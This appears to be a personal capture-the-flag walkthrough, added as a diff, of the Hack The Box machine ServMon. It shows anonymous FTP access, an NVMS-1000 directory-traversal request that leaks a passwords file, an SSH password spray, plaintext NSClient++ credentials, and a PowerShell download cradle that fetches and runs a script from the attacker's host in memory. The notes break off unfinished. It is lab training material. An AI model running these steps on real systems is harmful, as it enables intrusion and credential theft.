@@ -1,0 +1,204 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ftp 10.10.10.184                  
+Connected to 10.10.10.184.
+220 Microsoft FTP Service
+Name (10.10.10.184:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||49677|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:35PM       <DIR>          Users
+226 Transfer complete.
+ftp> cd Users
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||49678|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:36PM       <DIR>          Nadine
+02-28-22  06:37PM       <DIR>          Nathan
+226 Transfer complete.
+ftp> cd Nadine
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||49679|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:36PM                  168 Confidential.txt
+226 Transfer complete.
+ftp> get Confidential.txt
+local: Confidential.txt remote: Confidential.txt
+229 Entering Extended Passive Mode (|||49681|)
+125 Data connection already open; Transfer starting.
+100% |************************************************************************|   168        6.94 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 6 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+168 bytes received in 00:00 (6.88 KiB/s)
+ftp> cd ..
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||49682|)
+150 Opening ASCII mode data connection.
+02-28-22  06:36PM       <DIR>          Nadine
+02-28-22  06:37PM       <DIR>          Nathan
+226 Transfer complete.
+ftp> cd Nathan
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||49683|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:36PM                  182 Notes to do.txt
+226 Transfer complete.
+ftp> get Notes\ to\ do.txt
+local: Notes to do.txt remote: Notes to do.txt
+229 Entering Extended Passive Mode (|||49685|)
+125 Data connection already open; Transfer starting.
+100% |************************************************************************|   182        7.54 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 4 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+182 bytes received in 00:00 (7.48 KiB/s)
+ftp> 
+ftp> exit
+221 Goodbye.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat Confidential.txt      
+Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+
+Regards
+
+Nadine                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat Notes\ to\ do.txt 
+1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit NVMS      
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+NVMS 1000 - Directory Traversal                                                    | hardware/webapps/47774.txt
+
+
+GET ../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
+Host: 10.10.10.184
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.10.10.184/
+Connection: keep-alive
+Cookie: dataPort=6063
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+HTTP/1.1 200 OK
+Content-type: text/plain
+Content-Length: 156
+Connection: close
+AuthInfo: 
+
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# crackmapexec ssh 10.10.10.184 -u users -p passwords                   
+SSH         10.10.10.184    22     10.10.10.184     [*] SSH-2.0-OpenSSH_for_Windows_8.0
+SSH         10.10.10.184    22     10.10.10.184     [-] Nadine:1nsp3ctTh3Way2Mars! Authentication failed.
+SSH         10.10.10.184    22     10.10.10.184     [-] Nadine:Th3r34r3To0M4nyTrait0r5! Authentication failed.
+SSH         10.10.10.184    22     10.10.10.184     [-] Nadine:B3WithM30r4ga1n5tMe Authentication failed.
+SSH         10.10.10.184    22     10.10.10.184     [+] Nadine:L1k3B1gBut7s@W0rk 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh Nadine@10.10.10.184                   
+The authenticity of host '10.10.10.184 (10.10.10.184)' can't be established.
+ED25519 key fingerprint is SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.184' (ED25519) to the list of known hosts.
+Nadine@10.10.10.184's password: 
+
+Microsoft Windows [Version 10.0.17763.864]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine>
+
+
+
+nadine@SERVMON C:\Program Files\NSClient++>more nsclient.ini
+ï»¿# If you want to fill this file with all available options run the following command:
+#   nscp settings --generate --add-defaults --load-all
+# If you want to activate a module and bring in all its options use:
+#   nscp settings --activate-module <MODULE NAME> --add-defaults
+# For details run: nscp settings --help
+
+
+; in flight - TODO
+[/settings/default]
+
+; Undocumented key
+password = ew2x6SsGTxjRwXOT
+
+; Undocumented key
+allowed hosts = 127.0.0.1
+
+
+nadine@SERVMON C:\Program Files\NSClient++>cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
+NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
+
+nadine@SERVMON C:\Program Files\NSClient++>
+
+
+
+we are going to use the Msxml2.XMLHTTP download cradle to execute in memory and check our permissions on the program
+
+PS C:\Program Files\NSClient++> $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.49:8000/Get-Se
+rviceAcl.ps1',$false);$h.send();iex $h.responseText
+PS C:\Program Files\NSClient++>  
+
+
+
+from here, problems with getting the site to load pages properly.
+will come back.
+
+
+https://localhost:8443/index.html
+
+
+
+
+
+
+
+
+
+
+
+
